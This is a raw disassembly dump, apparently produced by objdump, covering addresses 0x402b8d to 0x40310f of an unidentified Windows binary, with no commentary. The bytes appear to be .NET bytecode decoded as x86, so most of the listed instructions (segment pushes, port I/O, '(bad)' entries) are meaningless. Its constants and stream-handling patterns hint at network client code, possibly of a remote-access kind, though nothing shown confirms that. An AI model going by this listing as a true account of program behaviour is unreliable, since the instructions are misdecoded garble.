  402b8d:	c0 00 00             	rolb   $0x0,(%eax)
  402b90:	00 16                	add    %dl,(%esi)
  402b92:	6f                   	outsl  %ds:(%esi),(%dx)
  402b93:	39 00                	cmp    %eax,(%eax)
  402b95:	00 0a                	add    %cl,(%edx)
  402b97:	1a 6a 28             	sbb    0x28(%edx),%ch
  402b9a:	0d 00 00 06 28       	or     $0x28060000,%eax
  402b9f:	0c 00                	or     $0x0,%al
  402ba1:	00 06                	add    %al,(%esi)
  402ba3:	d4 8d                	aam    $0x8d
  402ba5:	44                   	inc    %esp
  402ba6:	00 00                	add    %al,(%eax)
  402ba8:	01 28                	add    %ebp,(%eax)
  402baa:	0b 00                	or     (%eax),%eax
  402bac:	00 06                	add    %al,(%esi)
  402bae:	16                   	push   %ss
  402baf:	6a 28                	push   $0x28
  402bb1:	0f 00 00             	sldt   (%eax)
  402bb4:	06                   	push   %es
  402bb5:	28 2f                	sub    %ch,(%edi)
  402bb7:	00 00                	add    %al,(%eax)
  402bb9:	06                   	push   %es
  402bba:	28 20                	sub    %ah,(%eax)
  402bbc:	00 00                	add    %al,(%eax)
  402bbe:	06                   	push   %es
  402bbf:	16                   	push   %ss
  402bc0:	28 18                	sub    %bl,(%eax)
  402bc2:	00 00                	add    %al,(%eax)
  402bc4:	06                   	push   %es
  402bc5:	16                   	push   %ss
  402bc6:	28 1a                	sub    %bl,(%edx)
  402bc8:	00 00                	add    %al,(%eax)
  402bca:	06                   	push   %es
  402bcb:	14 fe                	adc    $0xfe,%al
  402bcd:	06                   	push   %es
  402bce:	21 00                	and    %eax,(%eax)
  402bd0:	00 06                	add    %al,(%esi)
  402bd2:	73 3a                	jae    0x402c0e
  402bd4:	00 00                	add    %al,(%eax)
  402bd6:	0a 14 73             	or     (%ebx,%esi,2),%dl
  402bd9:	27                   	daa
  402bda:	00 00                	add    %al,(%eax)
  402bdc:	0a 20                	or     (%eax),%ah
  402bde:	10 27                	adc    %ah,(%edi)
  402be0:	00 00                	add    %al,(%eax)
  402be2:	20 98 3a 00 00 6f    	and    %bl,0x6f00003a(%eax)
  402be8:	32 00                	xor    (%eax),%al
  402bea:	00 0a                	add    %cl,(%edx)
  402bec:	73 27                	jae    0x402c15
  402bee:	00 00                	add    %al,(%eax)
  402bf0:	0a 20                	or     (%eax),%ah
  402bf2:	10 27                	adc    %ah,(%edi)
  402bf4:	00 00                	add    %al,(%eax)
  402bf6:	20 98 3a 00 00 6f    	and    %bl,0x6f00003a(%eax)
  402bfc:	32 00                	xor    (%eax),%al
  402bfe:	00 0a                	add    %cl,(%edx)
  402c00:	73 3b                	jae    0x402c3d
  402c02:	00 00                	add    %al,(%eax)
  402c04:	0a 28                	or     (%eax),%ch
  402c06:	11 00                	adc    %eax,(%eax)
  402c08:	00 06                	add    %al,(%esi)
  402c0a:	14 fe                	adc    $0xfe,%al
  402c0c:	06                   	push   %es
  402c0d:	22 00                	and    (%eax),%al
  402c0f:	00 06                	add    %al,(%esi)
  402c11:	73 3a                	jae    0x402c4d
  402c13:	00 00                	add    %al,(%eax)
  402c15:	0a 14 17             	or     (%edi,%edx,1),%dl
  402c18:	17                   	pop    %ss
  402c19:	73 3b                	jae    0x402c56
  402c1b:	00 00                	add    %al,(%eax)
  402c1d:	0a 28                	or     (%eax),%ch
  402c1f:	16                   	push   %ss
  402c20:	00 00                	add    %al,(%eax)
  402c22:	06                   	push   %es
  402c23:	28 08                	sub    %cl,(%eax)
  402c25:	00 00                	add    %al,(%eax)
  402c27:	06                   	push   %es
  402c28:	28 0a                	sub    %cl,(%edx)
  402c2a:	00 00                	add    %al,(%eax)
  402c2c:	06                   	push   %es
  402c2d:	28 0e                	sub    %cl,(%esi)
  402c2f:	00 00                	add    %al,(%eax)
  402c31:	06                   	push   %es
  402c32:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402c38:	69 14 fe 06 1f 00 00 	imul   $0x1f06,(%esi,%edi,8),%edx
  402c3f:	06                   	push   %es
  402c40:	73 3c                	jae    0x402c7e
  402c42:	00 00                	add    %al,(%eax)
  402c44:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  402c47:	3d 00 00 0a 26       	cmp    $0x260a0000,%eax
  402c4c:	38 06                	cmp    %al,(%esi)
  402c4e:	00 00                	add    %al,(%eax)
  402c50:	00 16                	add    %dl,(%esi)
  402c52:	28 13                	sub    %dl,(%ebx)
  402c54:	00 00                	add    %al,(%eax)
  402c56:	06                   	push   %es
  402c57:	dd 0c 00             	fisttpll (%eax,%eax,1)
  402c5a:	00 00                	add    %al,(%eax)
  402c5c:	26 16                	es push %ss
  402c5e:	28 13                	sub    %dl,(%ebx)
  402c60:	00 00                	add    %al,(%eax)
  402c62:	06                   	push   %es
  402c63:	dd 00                	fldl   (%eax)
  402c65:	00 00                	add    %al,(%eax)
  402c67:	00 2a                	add    %ch,(%edx)
  402c69:	00 00                	add    %al,(%eax)
  402c6b:	00 41 4c             	add    %al,0x4c(%ecx)
  402c6e:	00 00                	add    %al,(%eax)
  402c70:	00 00                	add    %al,(%eax)
  402c72:	00 00                	add    %al,(%eax)
  402c74:	ce                   	into
  402c75:	00 00                	add    %al,(%eax)
  402c77:	00 26                	add    %ah,(%esi)
  402c79:	00 00                	add    %al,(%eax)
  402c7b:	00 f4                	add    %dh,%ah
  402c7d:	00 00                	add    %al,(%eax)
  402c7f:	00 06                	add    %al,(%esi)
  402c81:	00 00                	add    %al,(%eax)
  402c83:	00 01                	add    %al,(%ecx)
  402c85:	00 00                	add    %al,(%eax)
  402c87:	01 02                	add    %eax,(%edx)
  402c89:	00 00                	add    %al,(%eax)
  402c8b:	00 21                	add    %ah,(%ecx)
  402c8d:	01 00                	add    %eax,(%eax)
  402c8f:	00 82 00 00 00 a3    	add    %al,-0x5d000000(%edx)
  402c95:	01 00                	add    %eax,(%eax)
  402c97:	00 0f                	add    %cl,(%edi)
	...
  402ca5:	00 00                	add    %al,(%eax)
  402ca7:	00 e4                	add    %ah,%ah
  402ca9:	02 00                	add    (%eax),%al
  402cab:	00 e4                	add    %ah,%ah
  402cad:	02 00                	add    (%eax),%al
  402caf:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402cb2:	00 00                	add    %al,(%eax)
  402cb4:	01 00                	add    %eax,(%eax)
  402cb6:	00 01                	add    %al,(%ecx)
  402cb8:	1b 30                	sbb    (%eax),%esi
  402cba:	02 00                	add    (%eax),%al
  402cbc:	6a 00                	push   $0x0
  402cbe:	00 00                	add    %al,(%eax)
  402cc0:	00 00                	add    %al,(%eax)
  402cc2:	00 00                	add    %al,(%eax)
  402cc4:	28 08                	sub    %cl,(%eax)
  402cc6:	00 00                	add    %al,(%eax)
  402cc8:	06                   	push   %es
  402cc9:	25 3a 06 00 00       	and    $0x63a,%eax
  402cce:	00 26                	add    %ah,(%esi)
  402cd0:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402cd6:	40                   	inc    %eax
  402cd7:	00 00                	add    %al,(%eax)
  402cd9:	0a 28                	or     (%eax),%ch
  402cdb:	06                   	push   %es
  402cdc:	00 00                	add    %al,(%eax)
  402cde:	06                   	push   %es
  402cdf:	25 3a 06 00 00       	and    $0x63a,%eax
  402ce4:	00 26                	add    %ah,(%esi)
  402ce6:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402cec:	41                   	inc    %ecx
  402ced:	00 00                	add    %al,(%eax)
  402cef:	0a 28                	or     (%eax),%ch
  402cf1:	15 00 00 06 25       	adc    $0x25060000,%eax
  402cf6:	3a 06                	cmp    (%esi),%al
  402cf8:	00 00                	add    %al,(%eax)
  402cfa:	00 26                	add    %ah,(%esi)
  402cfc:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402d02:	42                   	inc    %edx
  402d03:	00 00                	add    %al,(%eax)
  402d05:	0a 28                	or     (%eax),%ch
  402d07:	10 00                	adc    %al,(%eax)
  402d09:	00 06                	add    %al,(%esi)
  402d0b:	25 3a 06 00 00       	and    $0x63a,%eax
  402d10:	00 26                	add    %ah,(%esi)
  402d12:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402d18:	42                   	inc    %edx
  402d19:	00 00                	add    %al,(%eax)
  402d1b:	0a dd                	or     %ch,%bl
  402d1d:	06                   	push   %es
  402d1e:	00 00                	add    %al,(%eax)
  402d20:	00 26                	add    %ah,(%esi)
  402d22:	dd 00                	fldl   (%eax)
  402d24:	00 00                	add    %al,(%eax)
  402d26:	00 16                	add    %dl,(%esi)
  402d28:	28 13                	sub    %dl,(%ebx)
  402d2a:	00 00                	add    %al,(%eax)
  402d2c:	06                   	push   %es
  402d2d:	2a 00                	sub    (%eax),%al
  402d2f:	00 01                	add    %al,(%ecx)
  402d31:	10 00                	adc    %al,(%eax)
  402d33:	00 00                	add    %al,(%eax)
  402d35:	00 00                	add    %al,(%eax)
  402d37:	00 5d 5d             	add    %bl,0x5d(%ebp)
  402d3a:	00 06                	add    %al,(%esi)
  402d3c:	01 00                	add    %eax,(%eax)
  402d3e:	00 01                	add    %al,(%ecx)
  402d40:	1b 30                	sbb    (%eax),%esi
  402d42:	06                   	push   %es
  402d43:	00 ba 01 00 00 04    	add    %bh,0x4000001(%edx)
  402d49:	00 00                	add    %al,(%eax)
  402d4b:	11 28                	adc    %ebp,(%eax)
  402d4d:	06                   	push   %es
  402d4e:	00 00                	add    %al,(%eax)
  402d50:	06                   	push   %es
  402d51:	6f                   	outsl  %ds:(%esi),(%dx)
  402d52:	2b 00                	sub    (%eax),%eax
  402d54:	00 0a                	add    %cl,(%edx)
  402d56:	39 0a                	cmp    %ecx,(%edx)
  402d58:	00 00                	add    %al,(%eax)
  402d5a:	00 28                	add    %ch,(%eax)
  402d5c:	12 00                	adc    (%eax),%al
  402d5e:	00 06                	add    %al,(%esi)
  402d60:	3a 0b                	cmp    (%ebx),%cl
  402d62:	00 00                	add    %al,(%eax)
  402d64:	00 16                	add    %dl,(%esi)
  402d66:	28 13                	sub    %dl,(%ebx)
  402d68:	00 00                	add    %al,(%eax)
  402d6a:	06                   	push   %es
  402d6b:	dd 95 01 00 00 28    	fstl   0x28000001(%ebp)
  402d71:	08 00                	or     %al,(%eax)
  402d73:	00 06                	add    %al,(%esi)
  402d75:	02 6f 43             	add    0x43(%edi),%ch
  402d78:	00 00                	add    %al,(%eax)
  402d7a:	0a 0a                	or     (%edx),%cl
  402d7c:	06                   	push   %es
  402d7d:	16                   	push   %ss
  402d7e:	3e 6b 01 00          	imul   $0x0,%ds:(%ecx),%eax
  402d82:	00 28                	add    %ch,(%eax)
  402d84:	0e                   	push   %cs
  402d85:	00 00                	add    %al,(%eax)
  402d87:	06                   	push   %es
  402d88:	06                   	push   %es
  402d89:	6a 58                	push   $0x58
  402d8b:	28 0f                	sub    %cl,(%edi)
  402d8d:	00 00                	add    %al,(%eax)
  402d8f:	06                   	push   %es
  402d90:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402d93:	00 06                	add    %al,(%esi)
  402d95:	06                   	push   %es
  402d96:	6a 59                	push   $0x59
  402d98:	28 0d 00 00 06 28    	sub    %cl,0x28060000
  402d9e:	0c 00                	or     $0x0,%al
  402da0:	00 06                	add    %al,(%esi)
  402da2:	3a 02                	cmp    (%edx),%al
  402da4:	01 00                	add    %eax,(%eax)
  402da6:	00 28                	add    %ch,(%eax)
  402da8:	0a 00                	or     (%eax),%al
  402daa:	00 06                	add    %al,(%esi)
  402dac:	16                   	push   %ss
  402dad:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  402db1:	0a 6a 28             	or     0x28(%edx),%ch
  402db4:	0d 00 00 06 28       	or     $0x28060000,%eax
  402db9:	0c 00                	or     $0x0,%al
  402dbb:	00 06                	add    %al,(%esi)
  402dbd:	16                   	push   %ss
  402dbe:	6a 3e                	push   $0x3e
  402dc0:	c2 00 00             	ret    $0x0
  402dc3:	00 16                	add    %dl,(%esi)
  402dc5:	6a 28                	push   $0x28
  402dc7:	0f 00 00             	sldt   (%eax)
  402dca:	06                   	push   %es
  402dcb:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402dce:	00 06                	add    %al,(%esi)
  402dd0:	d4 8d                	aam    $0x8d
  402dd2:	44                   	inc    %esp
  402dd3:	00 00                	add    %al,(%eax)
  402dd5:	01 28                	add    %ebp,(%eax)
  402dd7:	0b 00                	or     (%eax),%eax
  402dd9:	00 06                	add    %al,(%esi)
  402ddb:	38 5f 00             	cmp    %bl,0x0(%edi)
  402dde:	00 00                	add    %al,(%eax)
  402de0:	28 08                	sub    %cl,(%eax)
  402de2:	00 00                	add    %al,(%eax)
  402de4:	06                   	push   %es
  402de5:	28 0a                	sub    %cl,(%edx)
  402de7:	00 00                	add    %al,(%eax)
  402de9:	06                   	push   %es
  402dea:	28 0e                	sub    %cl,(%esi)
  402dec:	00 00                	add    %al,(%eax)
  402dee:	06                   	push   %es
  402def:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402df5:	69 6f 45 00 00 0a 0b 	imul   $0xb0a0000,0x45(%edi),%ebp
  402dfc:	07                   	pop    %es
  402dfd:	16                   	push   %ss
  402dfe:	3d 0b 00 00 00       	cmp    $0xb,%eax
  402e03:	16                   	push   %ss
  402e04:	28 13                	sub    %dl,(%ebx)
  402e06:	00 00                	add    %al,(%eax)
  402e08:	06                   	push   %es
  402e09:	dd f7                	(bad)
  402e0b:	00 00                	add    %al,(%eax)
  402e0d:	00 28                	add    %ch,(%eax)
  402e0f:	0e                   	push   %cs
  402e10:	00 00                	add    %al,(%eax)
  402e12:	06                   	push   %es
  402e13:	07                   	pop    %es
  402e14:	6a 58                	push   $0x58
  402e16:	28 0f                	sub    %cl,(%edi)
  402e18:	00 00                	add    %al,(%eax)
  402e1a:	06                   	push   %es
  402e1b:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402e1e:	00 06                	add    %al,(%esi)
  402e20:	07                   	pop    %es
  402e21:	6a 59                	push   $0x59
  402e23:	28 0d 00 00 06 28    	sub    %cl,0x28060000
  402e29:	0c 00                	or     $0x0,%al
  402e2b:	00 06                	add    %al,(%esi)
  402e2d:	16                   	push   %ss
  402e2e:	6a 3c                	push   $0x3c
  402e30:	0b 00                	or     (%eax),%eax
  402e32:	00 00                	add    %al,(%eax)
  402e34:	16                   	push   %ss
  402e35:	28 13                	sub    %dl,(%ebx)
  402e37:	00 00                	add    %al,(%eax)
  402e39:	06                   	push   %es
  402e3a:	dd c6                	ffree  %st(6)
  402e3c:	00 00                	add    %al,(%eax)
  402e3e:	00 28                	add    %ch,(%eax)
  402e40:	0c 00                	or     $0x0,%al
  402e42:	00 06                	add    %al,(%esi)
  402e44:	16                   	push   %ss
  402e45:	6a 30                	push   $0x30
  402e47:	98                   	cwtl
  402e48:	14 fe                	adc    $0xfe,%al
  402e4a:	06                   	push   %es
  402e4b:	46                   	inc    %esi
  402e4c:	00 00                	add    %al,(%eax)
  402e4e:	06                   	push   %es
  402e4f:	73 46                	jae    0x402e97
  402e51:	00 00                	add    %al,(%eax)
  402e53:	0a 73 47             	or     0x47(%ebx),%dh
  402e56:	00 00                	add    %al,(%eax)
  402e58:	0a 28                	or     (%eax),%ch
  402e5a:	0a 00                	or     (%eax),%al
  402e5c:	00 06                	add    %al,(%esi)
  402e5e:	6f                   	outsl  %ds:(%esi),(%dx)
  402e5f:	48                   	dec    %eax
  402e60:	00 00                	add    %al,(%eax)
  402e62:	0a 16                	or     (%esi),%dl
  402e64:	6a 28                	push   $0x28
  402e66:	0f 00 00             	sldt   (%eax)
  402e69:	06                   	push   %es
  402e6a:	1a 6a 28             	sbb    0x28(%edx),%ch
  402e6d:	0d 00 00 06 28       	or     $0x28060000,%eax
  402e72:	0c 00                	or     $0x0,%al
  402e74:	00 06                	add    %al,(%esi)
  402e76:	d4 8d                	aam    $0x8d
  402e78:	44                   	inc    %esp
  402e79:	00 00                	add    %al,(%eax)
  402e7b:	01 28                	add    %ebp,(%eax)
  402e7d:	0b 00                	or     (%eax),%eax
  402e7f:	00 06                	add    %al,(%esi)
  402e81:	38 3a                	cmp    %bh,(%edx)
  402e83:	00 00                	add    %al,(%eax)
  402e85:	00 1a                	add    %bl,(%edx)
  402e87:	6a 28                	push   $0x28
  402e89:	0d 00 00 06 28       	or     $0x28060000,%eax
  402e8e:	0c 00                	or     $0x0,%al
  402e90:	00 06                	add    %al,(%esi)
  402e92:	d4 8d                	aam    $0x8d
  402e94:	44                   	inc    %esp
  402e95:	00 00                	add    %al,(%eax)
  402e97:	01 28                	add    %ebp,(%eax)
  402e99:	0b 00                	or     (%eax),%eax
  402e9b:	00 06                	add    %al,(%esi)
  402e9d:	16                   	push   %ss
  402e9e:	6a 28                	push   $0x28
  402ea0:	0f 00 00             	sldt   (%eax)
  402ea3:	06                   	push   %es
  402ea4:	38 17                	cmp    %dl,(%edi)
  402ea6:	00 00                	add    %al,(%eax)
  402ea8:	00 28                	add    %ch,(%eax)
  402eaa:	0c 00                	or     $0x0,%al
  402eac:	00 06                	add    %al,(%esi)
  402eae:	16                   	push   %ss
  402eaf:	6a 3c                	push   $0x3c
  402eb1:	0b 00                	or     (%eax),%eax
  402eb3:	00 00                	add    %al,(%eax)
  402eb5:	16                   	push   %ss
  402eb6:	28 13                	sub    %dl,(%ebx)
  402eb8:	00 00                	add    %al,(%eax)
  402eba:	06                   	push   %es
  402ebb:	dd 45 00             	fldl   0x0(%ebp)
  402ebe:	00 00                	add    %al,(%eax)
  402ec0:	28 08                	sub    %cl,(%eax)
  402ec2:	00 00                	add    %al,(%eax)
  402ec4:	06                   	push   %es
  402ec5:	28 0a                	sub    %cl,(%edx)
  402ec7:	00 00                	add    %al,(%eax)
  402ec9:	06                   	push   %es
  402eca:	28 0e                	sub    %cl,(%esi)
  402ecc:	00 00                	add    %al,(%eax)
  402ece:	06                   	push   %es
  402ecf:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402ed5:	69 14 fe 06 1f 00 00 	imul   $0x1f06,(%esi,%edi,8),%edx
  402edc:	06                   	push   %es
  402edd:	73 3c                	jae    0x402f1b
  402edf:	00 00                	add    %al,(%eax)
  402ee1:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  402ee4:	3d 00 00 0a 26       	cmp    $0x260a0000,%eax
  402ee9:	38 06                	cmp    %al,(%esi)
  402eeb:	00 00                	add    %al,(%eax)
  402eed:	00 16                	add    %dl,(%esi)
  402eef:	28 13                	sub    %dl,(%ebx)
  402ef1:	00 00                	add    %al,(%eax)
  402ef3:	06                   	push   %es
  402ef4:	dd 0c 00             	fisttpll (%eax,%eax,1)
  402ef7:	00 00                	add    %al,(%eax)
  402ef9:	26 16                	es push %ss
  402efb:	28 13                	sub    %dl,(%ebx)
  402efd:	00 00                	add    %al,(%eax)
  402eff:	06                   	push   %es
  402f00:	dd 00                	fldl   (%eax)
  402f02:	00 00                	add    %al,(%eax)
  402f04:	00 2a                	add    %ch,(%edx)
  402f06:	00 00                	add    %al,(%eax)
  402f08:	41                   	inc    %ecx
  402f09:	1c 00                	sbb    $0x0,%al
	...
  402f13:	00 ad 01 00 00 ad    	add    %ch,-0x52ffffff(%ebp)
  402f19:	01 00                	add    %eax,(%eax)
  402f1b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402f1e:	00 00                	add    %al,(%eax)
  402f20:	01 00                	add    %eax,(%eax)
  402f22:	00 01                	add    %al,(%ecx)
  402f24:	1b 30                	sbb    (%eax),%esi
  402f26:	04 00                	add    $0x0,%al
  402f28:	04 01                	add    $0x1,%al
  402f2a:	00 00                	add    %al,(%eax)
  402f2c:	05 00 00 11 28       	add    $0x28110000,%eax
  402f31:	14 00                	adc    $0x0,%al
  402f33:	00 06                	add    %al,(%esi)
  402f35:	0a 16                	or     (%esi),%dl
  402f37:	0b 06                	or     (%esi),%eax
  402f39:	12 01                	adc    (%ecx),%al
  402f3b:	28 49 00             	sub    %cl,0x0(%ecx)
  402f3e:	00 0a                	add    %cl,(%edx)
  402f40:	28 12                	sub    %dl,(%edx)
  402f42:	00 00                	add    %al,(%eax)
  402f44:	06                   	push   %es
  402f45:	3a 05 00 00 00 dd    	cmp    0xdd000000,%al
  402f4b:	e4 00                	in     $0x0,%al
  402f4d:	00 00                	add    %al,(%eax)
  402f4f:	02 8e 69 28 4a 00    	add    0x4a2869(%esi),%cl
  402f55:	00 0a                	add    %cl,(%edx)
  402f57:	0c 28                	or     $0x28,%al
  402f59:	06                   	push   %es
  402f5a:	00 00                	add    %al,(%eax)
  402f5c:	06                   	push   %es
  402f5d:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402f62:	00 0a                	add    %cl,(%edx)
  402f64:	26 28 08             	sub    %cl,%es:(%eax)
  402f67:	00 00                	add    %al,(%eax)
  402f69:	06                   	push   %es
  402f6a:	08 16                	or     %dl,(%esi)
  402f6c:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  402f72:	00 0a                	add    %cl,(%edx)
  402f74:	02 8e 69 20 40 42    	add    0x42402069(%esi),%cl
  402f7a:	0f 00                	(bad)
  402f7c:	3e 6e                	outsb  %ds:(%esi),(%dx)
  402f7e:	00 00                	add    %al,(%eax)
  402f80:	00 02                	add    %al,(%edx)
  402f82:	73 4d                	jae    0x402fd1
  402f84:	00 00                	add    %al,(%eax)
  402f86:	0a 0d 16 13 04 09    	or     0x9041316,%cl
  402f8c:	16                   	push   %ss
  402f8d:	6a 6f                	push   $0x6f
  402f8f:	4e                   	dec    %esi
  402f90:	00 00                	add    %al,(%eax)
  402f92:	0a 20                	or     (%eax),%ah
  402f94:	50                   	push   %eax
  402f95:	c3                   	ret
  402f96:	00 00                	add    %al,(%eax)
  402f98:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  402f9c:	01 13                	add    %edx,(%ebx)
  402f9e:	05 38 26 00 00       	add    $0x2638,%eax
  402fa3:	00 28                	add    %ch,(%eax)
  402fa5:	06                   	push   %es
  402fa6:	00 00                	add    %al,(%eax)
  402fa8:	06                   	push   %es
  402fa9:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402fae:	00 0a                	add    %cl,(%edx)
  402fb0:	26 28 08             	sub    %cl,%es:(%eax)
  402fb3:	00 00                	add    %al,(%eax)
  402fb5:	06                   	push   %es
  402fb6:	11 05 16 11 04 6f    	adc    %eax,0x6f041116
  402fbc:	4c                   	dec    %esp
  402fbd:	00 00                	add    %al,(%eax)
  402fbf:	0a 28                	or     (%eax),%ch
  402fc1:	08 00                	or     %al,(%eax)
  402fc3:	00 06                	add    %al,(%esi)
  402fc5:	6f                   	outsl  %ds:(%esi),(%dx)
  402fc6:	4f                   	dec    %edi
  402fc7:	00 00                	add    %al,(%eax)
  402fc9:	0a 09                	or     (%ecx),%cl
  402fcb:	11 05 16 11 05 8e    	adc    %eax,0x8e051116
  402fd1:	69 6f 45 00 00 0a 25 	imul   $0x250a0000,0x45(%edi),%ebp
  402fd8:	13 04 16             	adc    (%esi,%edx,1),%eax
  402fdb:	30 c7                	xor    %al,%bh
  402fdd:	dd 33                	fnsave (%ebx)
  402fdf:	00 00                	add    %al,(%eax)
  402fe1:	00 09                	add    %cl,(%ecx)
  402fe3:	39 06                	cmp    %eax,(%esi)
  402fe5:	00 00                	add    %al,(%eax)
  402fe7:	00 09                	add    %cl,(%ecx)
  402fe9:	6f                   	outsl  %ds:(%esi),(%dx)
  402fea:	33 00                	xor    (%eax),%eax
  402fec:	00 0a                	add    %cl,(%edx)
  402fee:	dc 28                	fsubrl (%eax)
  402ff0:	06                   	push   %es
  402ff1:	00 00                	add    %al,(%eax)
  402ff3:	06                   	push   %es
  402ff4:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402ff9:	00 0a                	add    %cl,(%edx)
  402ffb:	26 28 08             	sub    %cl,%es:(%eax)
  402ffe:	00 00                	add    %al,(%eax)
  403000:	06                   	push   %es
  403001:	02 16                	add    (%esi),%dl
  403003:	02 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%cl
  403009:	00 0a                	add    %cl,(%edx)
  40300b:	28 08                	sub    %cl,(%eax)
  40300d:	00 00                	add    %al,(%eax)
  40300f:	06                   	push   %es
  403010:	6f                   	outsl  %ds:(%esi),(%dx)
  403011:	4f                   	dec    %edi
  403012:	00 00                	add    %al,(%eax)
  403014:	0a dd                	or     %ch,%bl
  403016:	19 00                	sbb    %eax,(%eax)
  403018:	00 00                	add    %al,(%eax)
  40301a:	26 16                	es push %ss
  40301c:	28 13                	sub    %dl,(%ebx)
  40301e:	00 00                	add    %al,(%eax)
  403020:	06                   	push   %es
  403021:	dd 0d 00 00 00 07    	fisttpll 0x7000000
  403027:	39 06                	cmp    %eax,(%esi)
  403029:	00 00                	add    %al,(%eax)
  40302b:	00 06                	add    %al,(%esi)
  40302d:	28 50 00             	sub    %dl,0x0(%eax)
  403030:	00 0a                	add    %cl,(%edx)
  403032:	dc 2a                	fsubrl (%edx)
  403034:	01 28                	add    %ebp,(%eax)
  403036:	00 00                	add    %al,(%eax)
  403038:	02 00                	add    (%eax),%al
  40303a:	58                   	pop    %eax
  40303b:	00 5a b2             	add    %bl,-0x4e(%edx)
  40303e:	00 0d 00 00 00 00    	add    %cl,0x0
  403044:	00 00                	add    %al,(%eax)
  403046:	10 00                	adc    %al,(%eax)
  403048:	da ea                	(bad)
  40304a:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  40304d:	00 00                	add    %al,(%eax)
  40304f:	01 02                	add    %eax,(%edx)
  403051:	00 08                	add    %cl,(%eax)
  403053:	00 ee                	add    %ch,%dh
  403055:	f6 00 0d             	testb  $0xd,(%eax)
  403058:	00 00                	add    %al,(%eax)
  40305a:	00 00                	add    %al,(%eax)
  40305c:	1b 30                	sbb    (%eax),%esi
  40305e:	03 00                	add    (%eax),%eax
  403060:	50                   	push   %eax
  403061:	00 00                	add    %al,(%eax)
  403063:	00 00                	add    %al,(%eax)
  403065:	00 00                	add    %al,(%eax)
  403067:	00 73 94             	add    %dh,-0x6c(%ebx)
  40306a:	00 00                	add    %al,(%eax)
  40306c:	06                   	push   %es
  40306d:	25 72 62 21 00       	and    $0x216272,%eax
  403072:	70 6f                	jo     0x4030e3
  403074:	7f 00                	jg     0x403076
  403076:	00 06                	add    %al,(%esi)
  403078:	72 70                	jb     0x4030ea
  40307a:	21 00                	and    %eax,(%eax)
  40307c:	70 6f                	jo     0x4030ed
  40307e:	8c 00                	mov    %es,(%eax)
  403080:	00 06                	add    %al,(%esi)
  403082:	25 72 7a 21 00       	and    $0x217a72,%eax
  403087:	70 6f                	jo     0x4030f8
  403089:	7f 00                	jg     0x40308b
  40308b:	00 06                	add    %al,(%esi)
  40308d:	28 35 00 00 06 6f    	sub    %dh,0x6f060000
  403093:	8c 00                	mov    %es,(%eax)
  403095:	00 06                	add    %al,(%esi)
  403097:	6f                   	outsl  %ds:(%esi),(%dx)
  403098:	89 00                	mov    %eax,(%eax)
  40309a:	00 06                	add    %al,(%esi)
  40309c:	28 20                	sub    %ah,(%eax)
  40309e:	00 00                	add    %al,(%eax)
  4030a0:	06                   	push   %es
  4030a1:	28 51 00             	sub    %dl,0x0(%ecx)
  4030a4:	00 0a                	add    %cl,(%edx)
  4030a6:	17                   	pop    %ss
  4030a7:	28 1a                	sub    %bl,(%edx)
  4030a9:	00 00                	add    %al,(%eax)
  4030ab:	06                   	push   %es
  4030ac:	dd 06                	fldl   (%esi)
  4030ae:	00 00                	add    %al,(%eax)
  4030b0:	00 26                	add    %ah,(%esi)
  4030b2:	dd 00                	fldl   (%eax)
  4030b4:	00 00                	add    %al,(%eax)
  4030b6:	00 2a                	add    %ch,(%edx)
  4030b8:	01 10                	add    %edx,(%eax)
  4030ba:	00 00                	add    %al,(%eax)
  4030bc:	00 00                	add    %al,(%eax)
  4030be:	00 00                	add    %al,(%eax)
  4030c0:	49                   	dec    %ecx
  4030c1:	49                   	dec    %ecx
  4030c2:	00 06                	add    %al,(%esi)
  4030c4:	01 00                	add    %eax,(%eax)
  4030c6:	00 01                	add    %al,(%ecx)
  4030c8:	1b 30                	sbb    (%eax),%esi
  4030ca:	02 00                	add    (%eax),%al
  4030cc:	2c 00                	sub    $0x0,%al
  4030ce:	00 00                	add    %al,(%eax)
  4030d0:	00 00                	add    %al,(%eax)
  4030d2:	00 00                	add    %al,(%eax)
  4030d4:	28 19                	sub    %bl,(%ecx)
  4030d6:	00 00                	add    %al,(%eax)
  4030d8:	06                   	push   %es
  4030d9:	39 16                	cmp    %edx,(%esi)
  4030db:	00 00                	add    %al,(%eax)
  4030dd:	00 28                	add    %ch,(%eax)
  4030df:	12 00                	adc    (%eax),%al
  4030e1:	00 06                	add    %al,(%esi)
  4030e3:	39 0c 00             	cmp    %ecx,(%eax,%eax,1)
  4030e6:	00 00                	add    %al,(%eax)
  4030e8:	28 17                	sub    %dl,(%edi)
  4030ea:	00 00                	add    %al,(%eax)
  4030ec:	06                   	push   %es
  4030ed:	17                   	pop    %ss
  4030ee:	58                   	pop    %eax
  4030ef:	28 18                	sub    %bl,(%eax)
  4030f1:	00 00                	add    %al,(%eax)
  4030f3:	06                   	push   %es
  4030f4:	dd 06                	fldl   (%esi)
  4030f6:	00 00                	add    %al,(%eax)
  4030f8:	00 26                	add    %ah,(%esi)
  4030fa:	dd 00                	fldl   (%eax)
  4030fc:	00 00                	add    %al,(%eax)
  4030fe:	00 2a                	add    %ch,(%edx)
  403100:	01 10                	add    %edx,(%eax)
  403102:	00 00                	add    %al,(%eax)
  403104:	00 00                	add    %al,(%eax)
  403106:	00 00                	add    %al,(%eax)
  403108:	25 25 00 06 01       	and    $0x1060025,%eax
  40310d:	00 00                	add    %al,(%eax)
  40310f:	01 1b                	add    %ebx,(%ebx)
